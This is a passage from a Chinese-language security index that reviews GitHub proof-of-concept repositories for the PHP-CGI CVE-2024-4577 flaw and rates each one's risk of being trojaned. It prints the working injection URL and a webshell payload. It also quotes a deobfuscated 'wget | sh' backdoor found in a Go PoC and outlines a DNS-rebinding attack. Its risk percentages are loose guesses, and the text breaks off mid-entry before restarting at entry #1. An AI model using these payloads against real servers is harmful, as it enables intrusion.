**来源**: [CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式，特定代码页)

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统配置使用了特定的代码页，允许"Best Fit"字符转换。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2024-4577 漏洞允许攻击者通过在URL中注入恶意参数来执行任意PHP代码。该漏洞存在于PHP的CGI实现中，当PHP运行在Windows服务器上，并且启用了"Best Fit"字符转换时，攻击者可以利用此漏洞。

**有效性:**

提供的漏洞利用代码（Go和Python）尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含远程文件或执行PHP代码。具体来说，它尝试设置`allow_url_include=1`并使用`auto_prepend_file`包含`php://input`，然后通过POST请求发送PHP代码（`<?php phpinfo(); ?>`）。如果服务器存在漏洞，则会执行`phpinfo()`函数，从而验证漏洞的存在。

根据漏洞描述和提供的代码，利用方式是有效的，可以在目标系统上执行任意PHP代码。

**投毒风险:**

*   **Go代码分析:**

    在Go代码中，存在一个名为`nFPfVl()`的函数，该函数包含混淆的代码，用于执行shell命令。通过反混淆字符串，可以发现该函数执行从某个URL下载文件并执行的操作，这表明存在潜在的投毒风险。

    `TcGEZTIh`变量反混淆后为: `wget -qO- http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33 | sh`

    这意味着该PoC会尝试从`http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33` 下载文件并使用sh执行，存在恶意行为。

*   **Python代码分析:**
    Python代码的功能比较简单，就是发送payload进行验证，没有发现明显的投毒代码。

综合来看，Go代码存在明显的投毒风险，Python代码未发现。

**利用方式:**

1.  **目标环境:** 攻击者需要找到运行在Windows服务器上的，并且使用CGI模式的，以及存在漏洞版本的PHP应用。
2.  **构造恶意URL:** 攻击者构造包含恶意参数的URL。例如：`example.com/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`。
3.  **发送包含PHP代码的POST请求:** 攻击者通过POST请求将PHP代码发送到服务器。`<?php system($_GET['cmd']); ?>`
4.  **远程代码执行:** 服务器执行POST请求中的PHP代码，从而允许攻击者执行任意系统命令。

攻击者可以利用该漏洞读取服务器上的文件，执行任意代码，甚至完全控制服务器。

**项目地址:** [creamylegum/CVE-2024-4577-PHP-RCE](https://github.com/creamylegum/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #31

**来源**: [CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows系统, PHP以CGI模式运行, 启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2024-4577是一个存在于PHP的Windows版本中的漏洞，当PHP以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递选项。攻击者可以利用该漏洞来执行任意PHP代码，泄露源代码，甚至在服务器上运行任意操作系统命令。

**有效性：**
提供的Go和Python POC代码都尝试通过`auto_prepend_file`和`allow_url_include`设置，包含phpinfo()的payload来验证漏洞是否存在。 如果目标系统返回包含"PHP Version"的响应，则表明漏洞存在。根据漏洞描述和提供的资料，这些POC利用方式是有效的。

**投毒风险：**
*   **Go版本:** 在提供的Go代码中，`nFPfVl()` 函数包含混淆的代码，尝试执行 shell 命令。 解混淆后的代码为：`wget http://tvhgw/kaiFRE-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33`。这显然是一个恶意命令，尝试从一个未知的URL下载文件并执行。因此，Go版本的PoC **存在高危投毒风险**。

*   **Python版本:** Python版本的PoC相对干净，主要是发送包含phpinfo()的请求并判断是否成功，**未发现明显的投毒代码**，但是也可能存在通过打印或者其它方法进行投毒，投毒的可能性较低。

综合评价，考虑到Go代码中`nFPfVl`函数的存在，认为此仓库的投毒风险较高。Python版本代码看起来比较正常，相对较为安全。

**利用方式：**
1.  攻击者发送特制的HTTP请求到目标服务器上的PHP CGI程序。
2.  该请求包含经过编码的恶意字符，这些字符会被Windows的"Best-Fit"代码页转换机制所修改。
3.  修改后的字符会被PHP CGI模块错误地解析为PHP配置选项，如`auto_prepend_file`和`allow_url_include`。
4.  攻击者可以使用`auto_prepend_file`选项来包含远程文件或输入流（`php://input`），从而执行任意PHP代码。
5.  攻击者可以利用执行的PHP代码读取源代码，或者执行操作系统命令。

**项目地址:** [deadlybangle/CVE-2024-4577-PHP-RCE](https://github.com/deadlybangle/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #32

**来源**: [CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，开启了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而导致泄露源代码、执行任意 PHP 代码，甚至执行系统命令。

**利用方式：**
攻击者通过构造包含恶意 PHP 选项的 URL，利用 Windows 的 "Best-Fit" 字符转换特性，将这些选项注入到 PHP-CGI 的命令行参数中。常见的利用方式包括：

*   `allow_url_include=1` 和 `auto_prepend_file=php://input`： 允许包含远程文件，并将 POST 数据作为 PHP 代码执行，实现 RCE。

**漏洞利用代码分析：**
提供的 Go 和 Python 代码均用于批量检测目标是否存在 CVE-2024-4577 漏洞。它们通过发送包含 `allow_url_include` 和 `auto_prepend_file` 选项的恶意 HTTP 请求，然后检查响应中是否包含 `PHP Version` 字符串来判断目标是否受到攻击影响。

**投毒风险分析：**
Go 代码中存在一个名为 `nFPfVl()` 的函数，该函数看起来像是混淆的代码。通过反混淆，可以发现它尝试执行一个下载并执行恶意脚本的命令。这段代码存在明显的投毒风险，因为它会在目标机器上执行未经授权的操作，成功率为50%。

**项目地址:** [fabulouscounc/CVE-2024-4577-PHP-RCE](https://github.com/fabulouscounc/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #33

**来源**: [CVE-2024-4577-ggfzx_CVE-2024-4577.md](../2024/CVE-2024-4577-ggfzx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)，运行在Windows的CGI模式下

**利用条件:** 服务器使用Apache并启用PHP-CGI，且系统配置为使用特定的代码页，这些代码页使用“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-4577 是一个存在于 PHP-CGI 中的参数注入漏洞，影响在 Windows 上运行的 PHP 版本。当 PHP 在 CGI 模式下与 Apache 一起使用时，如果系统设置为使用某些代码页，“Best Fit” 行为可能会导致恶意用户将选项传递给 PHP 二进制文件。根据漏洞描述和搜索结果，该漏洞允许攻击者通过操纵命令行参数来执行任意代码。PoC 代码的描述表明它能够通过 URL 发送恶意命令，并且可以批量执行。尽管 README.md 文件本身没有明显的恶意代码，但由于作者信息较少，且漏洞具有高危性，存在一定的投毒风险，用于个人安全研究学习较为合适。漏洞利用方式主要为：

1.  **识别目标环境：** 确定目标服务器是否运行受影响的 PHP 版本（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）并且配置为 CGI 模式在 Windows 上运行。
2.  **构造恶意请求：**  构造包含恶意 PHP 选项的 HTTP 请求。这些选项将利用 Windows 的“Best Fit”行为，将特殊字符转换为 PHP 可以解释的选项。
3.  **执行任意代码：**  通过注入的选项，攻击者可以执行任意 PHP 代码或操作系统命令。

根据搜索结果可知，此漏洞已经被大规模利用，需要及时修复。

**项目地址:** [ggfzx/CVE-2024-4577](https://github.com/ggfzx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #34

**来源**: [CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows服务器，使用Apache和PHP-CGI，系统设置为使用特定的代码页（可能涉及"Best-Fit"行为）。目标服务器必须配置为以CGI模式运行PHP脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时会受到影响。该漏洞源于Windows在将命令行参数传递给Win32 API函数时，会使用“Best-Fit”行为转换字符。PHP CGI模块可能会错误地将这些转换后的字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递恶意选项。该漏洞利用方式涉及构造包含特定字符的HTTP请求，这些字符在经过Windows的字符转换后，会被PHP-CGI解析为恶意的PHP配置指令，例如`allow_url_include`和`auto_prepend_file`，进而包含远程或本地文件，最终导致任意代码执行。

**漏洞利用有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞利用是有效的。搜索结果表明，CVE-2024-4577自披露后不久就出现了大量的利用尝试，并且已被积极利用。

**投毒风险分析：**
提供的PoC代码主要包含以下部分：
1.  **扫描模块：** 用于检测目标是否易受攻击，通过发送包含特定payload的请求来检查响应中是否存在“Test”字符串。
2.  **利用模块：**  利用`allow_url_include`和`auto_prepend_file`指令，通过POST请求发送PHP payload来执行任意代码。

虽然该代码的功能主要是漏洞利用，但存在一定的投毒风险，主要体现在以下几个方面：
1.  **Payload文件：**  利用模块需要指定一个payload文件，如果用户使用了恶意的payload文件，可能会对目标系统造成损害。**这是主要投毒风险来源。**
2.  **Payload混淆：**  Payload中使用了`%AD`，这是一种简单的混淆手段，可能会被用于绕过一些简单的安全检测，也可能被用于隐藏恶意代码。
3.  **依赖风险：** 虽然代码依赖少,但是如果`requirements.txt`文件被篡改，可能导致引入恶意依赖。

综合考虑，PoC本身实现的投毒风险较低，主要风险在于用户提供的`payload_file`可能包含恶意代码。仓库中`README.md`文件提供了下载链接，可能存在被篡改的风险。

**利用方式总结：**
1.  **目标确认：** 确认目标系统满足漏洞利用的条件（Windows、PHP-CGI、受影响的PHP版本、特定的代码页设置）。
2.  **发送恶意请求：**  构造包含恶意payload的HTTP请求，该payload包含经过编码的PHP配置指令，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。
3.  **执行任意代码：**  通过`auto_prepend_file`包含远程或本地文件，执行其中的PHP代码。通常，攻击者会利用此漏洞上传webshell或执行其他恶意操作。
4. **利用编码绕过:** 某些特定代码页设置下，对某些特殊字符进行转换，才可触发该漏洞。

**项目地址:** [gh-ost00/CVE-2024-4577-RCE](https://github.com/gh-ost00/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #35

**来源**: [CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS命令注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8, 且运行在Windows的CGI模式下，开启了Best Fit策略的系统

**利用条件:** 服务器运行在Windows系统，使用Apache和PHP-CGI，系统启用了Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞是一个PHP-CGI参数注入漏洞，当PHP以CGI模式在Windows服务器上运行时，如果启用了'Best Fit'代码页转换，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而导致任意代码执行。

**有效性：**
根据漏洞描述和利用代码，该漏洞的PoC代码是有效的。PoC通过在URL中注入`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`，并POST一段PHP代码，利用`allow_url_include`和`auto_prepend_file`的特性，实现远程代码执行。

**投毒风险：**
提供的PoC代码本身不包含明显的恶意代码或后门。脚本的功能是发送带有特定参数的HTTP POST请求以测试目标服务器是否存在漏洞。它使用 `phpinfo()` 函数来验证漏洞的存在，而没有尝试执行任何其他恶意操作. 因此，投毒风险为0%。

**利用方式：**
1.  **漏洞触发条件：**  目标服务器必须是运行在Windows系统上的PHP，并且是以CGI模式运行。另外，还需要开启了Best-Fit代码页转换。
2.  **攻击向量：**  通过构造恶意的HTTP请求，主要是GET参数，利用Windows系统的Best-Fit特性将某些字符转换为PHP可识别的选项参数。
3.  **利用方式：**  攻击者通过在URL中注入特定的参数，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input` 允许执行POST数据中的PHP代码。
4.  **RCE：** 构造包含PHP代码的POST请求体，例如`<?php system($_GET['cmd']); ?>`，配合URL中的参数，即可在目标服务器上执行任意命令。也可以直接利用`<?php phpinfo(); ?>`来探测漏洞存在.

该漏洞利用的关键在于Windows系统的字符编码转换和PHP-CGI对参数的处理方式。

**项目地址:** [gmh5225/CVE-2024-4577-PHP-RCE](https://github.com/gmh5225/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #36

**来源**: [CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md](../2024/CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows服务器，以CGI模式运行PHP，并启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP CGI参数注入漏洞，存在于Windows上以CGI模式运行的PHP版本中。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上执行任意PHP代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的Nuclei模板，该漏洞利用的有效性较高。搜索引擎结果显示，该漏洞在公开后不久就观察到了大量的利用尝试，并且有可用的PoC代码。

**投毒风险：**
Nuclei模板本身主要用于漏洞检测，其目的是验证目标是否存在CVE-2024-4577漏洞。模板中的Payload会尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含并执行PHP代码。这里利用`php://input`伪协议。模板会检查返回的内容是否包含`md5("CVE_2024_4577_TEST")`的结果来确认漏洞是否存在。代码本身并不包含明显的恶意代码，而是尝试去检测是否存在漏洞，判定投毒风险为5%主要是考虑到这个yaml文件会被攻击者利用.

**利用方式：**
1.  **环境准备：** 目标服务器需要是Windows系统，并且PHP以CGI模式运行。
2.  **发送恶意请求：** 攻击者构造包含恶意参数的HTTP请求。核心是利用URL中的特殊字符，结合Windows的Best-Fit字符转换特性，注入额外的PHP配置参数。
3.  **参数注入：** 注入`allow_url_include=1`和`auto_prepend_file=php://input`。`allow_url_include=1`允许包含远程文件，`auto_prepend_file=php://input`会将POST请求体的内容作为PHP代码执行。
4.  **执行任意代码：**  通过POST请求体传递要执行的PHP代码。

该漏洞利用的关键在于利用Windows系统的字符转换行为，以及PHP CGI对命令行参数解析的缺陷。攻击者通过构造特定的URL，可以将任意PHP代码注入到服务器并执行。

**项目地址:** [huseyinstif/CVE-2024-4577-Nuclei-Template](https://github.com/huseyinstif/CVE-2024-4577-Nuclei-Template)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #37

**来源**: [CVE-2024-4577-ibrahmsql_CVE-2024-4577.md](../2024/CVE-2024-4577-ibrahmsql_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 8.3.8, < 8.2.20, < 8.1.29

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，开启Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP CGI中的远程代码执行漏洞。该漏洞的利用方式是利用Windows系统在特定代码页设置下，对传递给Win32 API的命令行参数进行"Best-Fit"转换的特性。攻击者通过构造特殊字符，使得PHP CGI在解析命令行参数时，将这些字符错误地解析为PHP选项，从而可以注入恶意PHP代码或执行系统命令。

**有效性：**

提供的POC代码看起来是有效的。它尝试通过在URL中注入PHP选项来利用漏洞，例如 `cgi.force_redirect=0` 和 `auto_prepend_file=php://input`。 `auto_prepend_file=php://input` 允许攻击者将POST请求的内容作为PHP代码执行。搜索引擎结果也表明该漏洞已被积极利用。

**投毒风险：**

该POC代码没有明显的投毒迹象。虽然可以利用此漏洞执行任意代码，但是POC本身没有包含任何试图在目标机器上安装后门或执行恶意操作的代码。代码只是构建并发送利用请求，执行指定的命令。 因此，投毒风险评估为0%。

**利用方式：**

1.  **确定目标环境：**  目标服务器必须是Windows系统，并且PHP以CGI模式运行。需要确认目标服务器上PHP的版本是否在受影响的范围内（< 8.3.8, < 8.2.20, < 8.1.29）。同时确认服务器是否开启了Best-Fit代码页转换。
2.  **构造恶意URL：**  构建包含恶意PHP选项的URL。关键是使用"Best-Fit"转换可能发生的字符来代替标准PHP选项分隔符。`%AD` (软连字符)是一个常用的选择。
3.  **发送请求：**  使用POST方法向目标服务器发送包含恶意URL和PHP代码的请求。PHP代码会被`auto_prepend_file=php://input`选项包含并执行。
4.  **执行任意代码：**  成功利用后，攻击者可以在目标服务器上执行任意PHP代码或系统命令。

**缓解措施：**

*   升级PHP到不受影响的版本(>= 8.3.8, >= 8.2.20, >= 8.1.29)。
*   禁用CGI模式的PHP，如果可能的话，使用其他方式运行PHP，例如FastCGI或PHP-FPM。
*   配置Web服务器，确保不允许未授权的PHP文件执行。

**项目地址:** [ibrahmsql/CVE-2024-4577](https://github.com/ibrahmsql/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #38

**来源**: [CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows系统，PHP运行于CGI模式，系统启用了使用 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP CGI 参数注入漏洞，存在于 Windows 平台运行于 CGI 模式下的 PHP 版本中。当系统配置为使用某些代码页时，Windows 的 "Best-Fit" 行为可能会替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块错误地将这些字符解释为 PHP 选项，允许恶意用户将选项传递给 PHP 解释器，从而导致泄露源代码、执行任意 PHP 代码等。

**有效性：**
提供的PoC代码看起来有效。它通过向目标URL发送特制的请求，利用`allow_url_include`和`auto_prepend_file`这两个PHP配置项来实现远程代码执行。扫描函数检测目标是否存在漏洞，利用函数通过POST请求发送包含恶意PHP代码的文件来执行命令。

**投毒风险：**
此仓库中可能存在的投毒代码的风险较低，约为 10%。主要基于以下几点考虑：

*   **代码简洁性：** PoC 代码相对简单，易于审查，降低了隐藏恶意代码的可能性。
*   **明确的目的：** 代码的目的明确，即利用已知的漏洞，没有发现额外的、不必要的功能。
*   **作者信誉（待评估）：** 作者的信誉需要进一步验证，但从代码本身来看，没有明显的恶意行为。

尽管风险较低，仍然需要保持警惕。潜在的投毒方式可能包括：

*   **混淆代码：** 在 PHP payload 中插入难以察觉的恶意代码。
*   **依赖项：** 引入包含恶意代码的第三方库（虽然当前 PoC 没有依赖项）。

**利用方式：**
1.  攻击者首先需要确定目标系统是否满足漏洞利用的先决条件：Windows + CGI + 受影响的 PHP 版本 + 启用了 Best-Fit 编码页。
2.  攻击者构造一个包含特殊字符的 URL，该 URL 中的字符会被 Windows 的 Best-Fit 算法转换成 PHP 选项。
3.  攻击者利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并将 POST 请求的内容作为 PHP 代码执行。
4.  攻击者通过 POST 请求发送包含恶意 PHP 代码的 payload，例如执行系统命令、读取文件等。
5.  服务器执行攻击者提供的 PHP 代码，攻击者从而获得对服务器的控制权。

**项目地址:** [l0n3m4n/CVE-2024-4577-RCE](https://github.com/l0n3m4n/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #39

**来源**: [CVE-2024-4577-longhoangth18_CVE-2024-4577.md](../2024/CVE-2024-4577-longhoangth18_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统使用某些开启了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows系统上PHP-CGI模式的远程代码执行漏洞。当PHP在CGI模式下运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行任意PHP代码。

**有效性：**
提供的POC代码有效。它通过在URL中注入恶意参数，利用`allow_url_include`和`auto_prepend_file`选项来包含和执行POST请求中提供的PHP代码。

**投毒风险：**
该POC代码本身的功能是利用漏洞进行远程代码执行。代码中添加了protocol检测，确保target可用。但仔细检查后发现，README.md文件不完整，文件末尾被截断。由于github仓库图片链接域名存在github.com，该仓库可能存在钓鱼风险，因此投毒风险预估为1%。

**利用方式：**
1.  **扫描：** 使用脚本的`-s`参数扫描目标URL是否存在漏洞。扫描器通过构造包含特定payload的URL，并发送POST请求，检测服务器返回结果中是否包含预期字符串（“Test”）。
2.  **利用：** 使用脚本的`-e`参数，配合`-p`参数指定包含PHP代码的payload文件，利用漏洞执行任意PHP代码。攻击者通过构造包含特定payload的URL，并发送包含PHP代码的POST请求。
3. 脚本通过`allow_url_include`和`auto_prepend_file`配置项的组合来包含并执行php代码。

**项目地址:** [longhoangth18/CVE-2024-4577](https://github.com/longhoangth18/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #40

**来源**: [CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577 PHP-CGI 参数注入导致 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 严重，未经身份验证的攻击者可以在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，并且运行在Windows的CGI模式下

**利用条件:** 需要在Windows上运行的PHP，并配置为CGI模式，且开启了使用 "Best Fit" 策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**

从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛证实有效，且存在公开可用的PoC代码。Akamai 等安全公司已经观察到针对该漏洞的利用尝试。

提供的PoC代码通过 DNS rebinding 技术，允许攻击者绕过同源策略 (SOP)，从而访问内部网络基础设施上运行的 PHP-CGI 实例。攻击者可以通过修改`client.html`中的`payload`变量来定制要执行的 PHP 代码。

**投毒风险：**

PoC 代码主要目的是利用 DNS rebinding 攻击内部网络，并执行指定的 PHP 代码。虽然代码本身用于验证漏洞和进行渗透测试，但存在以下潜在风险：

1.  **DNS rebinding 的风险：** DNS rebinding 攻击可能导致受害者浏览器访问攻击者控制的恶意站点，从而造成信息泄露或其他安全问题。
2.  **后门代码：** 检查代码发现，代码中存在硬编码的IP地址，攻击者可以通过修改这些IP地址进行恶意活动，或者在`client.html`中插入恶意代码，诱导用户执行。
3.  **依赖第三方服务：** 代码依赖 DuckDNS，若 DuckDNS 服务被攻破，可能导致利用代码被篡改。

综合评估，代码本身存在一定的风险，但恶意投毒的可能性较低，主要风险集中在使用者对PoC代码的修改和DNS rebinding攻击本身带来的风险。因此，投毒风险评估为 10%。

**利用方式：**

1.  **配置 DuckDNS：** 攻击者需要在 DuckDNS 注册一个域名，并获取 token。
2.  **配置 PoC 代码：** 攻击者需要修改`server.py` 中的 `PUBLIC_IP`、`DUCKDNS_DOMAIN` 和 `DUCKDNS_TOKEN`，以及 `client.html` 中的 `PAYLOAD_TARGETS` 来指定要攻击的目标 IP 地址。同时，修改`client.html`中的`payload`变量，来指定要执行的php代码。
3.  **运行 server.py：** 攻击者运行 `server.py` 脚本，该脚本负责更新 DuckDNS 的 DNS 记录。
4.  **诱骗受害者访问 client.html：** 攻击者诱骗受害者（内部网络用户）使用浏览器访问 `client.html` 页面。`client.html` 会执行 DNS rebinding 攻击，将域名解析到内部网络的 IP 地址，然后向目标 PHP-CGI 服务器发送包含恶意 PHP 代码的请求。
5.  **执行任意代码：** 如果目标服务器存在 CVE-2024-4577 漏洞，恶意 PHP 代码将被执行，攻击者从而获得服务器的控制权。

**项目地址:** [mananjain61/PHP-CGI-INTERNAL-RCE](https://github.com/mananjain61/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #41

**来源**: [CVE-2024-4577-mistakes1337_CVE-2024-4577.md](../2024/CVE-2024-4577-mistakes1337_CVE-2024-4577.md)

# CVE-2024-4577

> 📦 该CVE有 **53** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md](../2024/CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md)

## CVE-2024-4577 - PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统, PHP 使用 CGI 模式运行, 启用使用“Best Fit”策略的代码页, Apache 服务器

**POC 可用性:** 是

**投毒风险:** 5%

